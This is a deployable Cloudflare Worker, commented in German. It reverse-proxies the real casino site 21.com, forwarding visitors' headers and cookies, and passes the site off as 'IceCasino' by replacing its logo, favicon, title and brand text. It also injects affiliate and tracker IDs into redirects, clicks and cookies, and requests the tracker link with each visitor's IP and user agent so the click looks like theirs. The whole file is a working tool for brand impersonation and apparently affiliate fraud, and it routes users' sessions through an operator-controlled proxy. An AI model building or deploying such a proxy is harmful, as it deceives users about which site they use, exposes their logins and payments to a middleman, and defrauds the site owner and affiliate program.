export default {
  async fetch(request) {
    const url = new URL(request.url);
    const targetBase = "https://www.21.com";

    // =========================================================================
    // 1. KONFIGURATION (Hier alle deine Anpassungen eintragen)
    // =========================================================================
    const affiliateTrackerUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
    
    // Links zu deinen Bildern
    const newLogoUrl = "https://images.law.com/brightspot/07/9a/9f50cbdc4a4eaa523a73b70a4814/flank-logo-1-767x633.jpg"; 
    const customFaviconUrl = "https://cdn.phototourl.com/member/2026-10-09-99fb820d-11f1-4174-b616-0d358ce6e8ad.jpg"; // Kleines Icon im Browser-Tab

    // Seitentitel im Browser-Tab
    const customTabTitle = "IceCasino - Bestes online Casino inkl. Sportwetten"; 

    // Begriffe auf der Seite suchen und ersetzen
    // Format: "Original-Wort auf der Seite": "Dein neues Wunsch-Wort"
    const textReplacements = {
      "21.com": "IceCasino",
      "21": "Ice",
      "21-Casino": "IceCasino"
    };
    // =========================================================================

    // Statische Dateien (Bilder, CSS, JS, Fonts) direkt durchlassen
    const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico|json)$/i);
    if (isStaticFile) {
      const fetchUrl = new URL(url.pathname + url.search, targetBase);
      return fetch(fetchUrl, {
        headers: { "Host": "www.21.com", "User-Agent": request.headers.get("User-Agent") || "" }
      });
    }

    // Cookies auslesen (Cookie-Gedächtnis)
    const cookieHeader = request.headers.get("Cookie") || "";
    const cookies = Object.fromEntries(cookieHeader.split(';').map(c => {
      const [k, v] = c.trim().split('=');
      return [k, v];
    }));

    let affiliateId = url.searchParams.get("affiliateId") || cookies["aff_affiliateId"];
    let trackerId = url.searchParams.get("trackerId") || cookies["aff_trackerId"];

    // Einmalig Tracking-ID vom Tracker abholen, falls noch nicht vorhanden
    if (!trackerId) {
      try {
        const trackerResponse = await fetch(affiliateTrackerUrl, {
          method: "GET",
          headers: {
            "User-Agent": request.headers.get("User-Agent") || "",
            "X-Forwarded-For": request.headers.get("CF-Connecting-IP") || "",
            "CF-Connecting-IP": request.headers.get("CF-Connecting-IP") || ""
          },
          redirect: "manual"
        });

        const locationHeader = trackerResponse.headers.get("Location");
        if (locationHeader) {
          const redirectTarget = new URL(locationHeader);
          affiliateId = redirectTarget.searchParams.get("affiliateId");
          trackerId = redirectTarget.searchParams.get("trackerId");
        }
      } catch (e) {
        console.error("Tracker Fetch Fehler:", e);
      }
    }

    // Parameter an URL anhängen, falls sie noch nicht vorhanden sind
    if (trackerId && !url.searchParams.has("trackerId")) {
      url.searchParams.set("trackerId", trackerId);
      if (affiliateId) url.searchParams.set("affiliateId", affiliateId);
      return Response.redirect(url.toString(), 302);
    }

    // Casino-Seite abrufen
    const fetchUrl = new URL(url.pathname + url.search, targetBase);
    const proxyHeaders = new Headers(request.headers);
    proxyHeaders.set("Host", "www.21.com");
    proxyHeaders.set("Referer", "https://www.21.com/");

    const response = await fetch(fetchUrl, {
      method: request.method,
      headers: proxyHeaders
    });

    const contentType = response.headers.get("content-type") || "";

    // HTML bearbeiten (Logo, Favicon, Title, Worte ersetzen)
    if (contentType.includes("text/html")) {
      let newResponse = new HTMLRewriter()
        .on("head", {
          element(el) {
            el.append(`
              <style>
                /* Logo dauerhaft ersetzen */
                img[src*="logo"], img[alt*="21.com"], img[aria-label*="21.com"] {
                  content: url("${newLogoUrl}") !important;
                }
              </style>
              <script>
                (function() {
                  const affId = "${affiliateId || ''}";
                  const trkId = "${trackerId || ''}";
                  const newTitle = "${customTabTitle}";
                  const newFavicon = "${customFaviconUrl}";
                  const replacements = ${JSON.stringify(textReplacements)};

                  // Funktion zum Ersetzen von Texten in allen Elementen
                  function replaceTextNodes(node) {
                    if (node.nodeType === Node.TEXT_NODE) {
                      let val = node.nodeValue;
                      let changed = false;
                      for (const [search, replace] of Object.entries(replacements)) {
                        if (search && val.includes(search)) {
                          val = val.split(search).join(replace);
                          changed = true;
                        }
                      }
                      if (changed) node.nodeValue = val;
                    } else {
                      for (const child of node.childNodes) {
                        if (child.nodeName !== 'SCRIPT' && child.nodeName !== 'STYLE') {
                          replaceTextNodes(child);
                        }
                      }
                    }
                  }

                  document.addEventListener("DOMContentLoaded", function() {
                    // 1. Tab-Titel anpassen
                    if (newTitle) document.title = newTitle;

                    // 2. Favicon (kleines Icon im Tab) anpassen
                    if (newFavicon) {
                      let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
                      link.type = 'image/x-icon';
                      link.rel = 'shortcut icon';
                      link.href = newFavicon;
                      document.getElementsByTagName('head')[0].appendChild(link);
                    }

                    // 3. Texte beim ersten Laden ersetzen
                    replaceTextNodes(document.body);

                    // 4. Texte auch bei dynamisch nachgeladenen Inhalten (React) ersetzen
                    const observer = new MutationObserver((mutations) => {
                      mutations.forEach((mutation) => {
                        mutation.addedNodes.forEach((node) => replaceTextNodes(node));
                      });
                    });
                    observer.observe(document.body, { childList: true, subtree: true });

                    // 5. Affiliate-Parameter bei Klicks weitergeben
                    if (affId && trkId) {
                      document.addEventListener("click", function(e) {
                        const a = e.target.closest("a");
                        if (a && a.href && a.href.startsWith(window.location.origin)) {
                          try {
                            const linkUrl = new URL(a.href);
                            if (!linkUrl.searchParams.has("trackerId")) {
                              linkUrl.searchParams.set("trackerId", trkId);
                              linkUrl.searchParams.set("affiliateId", affId);
                              a.href = linkUrl.toString();
                            }
                          } catch(err) {}
                        }
                      }, true);
                    }
                  });
                })();
              </script>
            `, { html: true });
          }
        })
        .transform(response);

      // Cookies setzen
      const headers = new Headers(newResponse.headers);
      if (trackerId) {
        headers.append("Set-Cookie", `aff_trackerId=${trackerId}; Path=/; Max-Age=2592000; SameSite=Lax`);
      }
      if (affiliateId) {
        headers.append("Set-Cookie", `aff_affiliateId=${affiliateId}; Path=/; Max-Age=2592000; SameSite=Lax`);
      }

      return new Response(newResponse.body, {
        status: newResponse.status,
        statusText: newResponse.statusText,
        headers: headers
      });
    }

    return response;
  }
};
